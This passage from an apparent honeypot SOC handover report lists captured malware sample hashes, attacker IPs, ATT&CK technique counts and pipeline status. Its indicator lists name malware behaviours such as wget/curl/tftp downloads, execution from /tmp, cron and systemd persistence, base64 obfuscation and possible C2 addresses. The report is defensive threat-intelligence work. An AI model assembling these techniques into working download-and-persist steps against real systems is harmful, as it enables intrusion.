| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.172[.]177` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `108.59.244[.]5` | US | InterLIR LLC | **100** ⚠️ | 0 |
| `109.160.32[.]65` | NL | Global Communication Net Plc | **100** ⚠️ | 19 |
| `93.123.109[.]6` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 18 |
| `213.177.179[.]195` | NL | wcd | **100** ⚠️ | 15 |
| `66.132.172[.]141` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `59.179.31[.]237` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 50 |
| `200.59.72[.]23` | AR | Sinectis S.A. | **100** ⚠️ | 22 |
| `94.154.43[.]57` | NL | Storm Industries LLC | **100** ⚠️ | 15 |
| `165.245.181[.]145` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 415 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 393 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 5 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 493 cases |
| Tool 34  | Credential Extractor        | ✅ 408 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 88 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (2.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 391 priority case(s) shown individually · 48 recon entry/entries in table (15 group(s) consolidating 55 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-27T18:09:59Z_
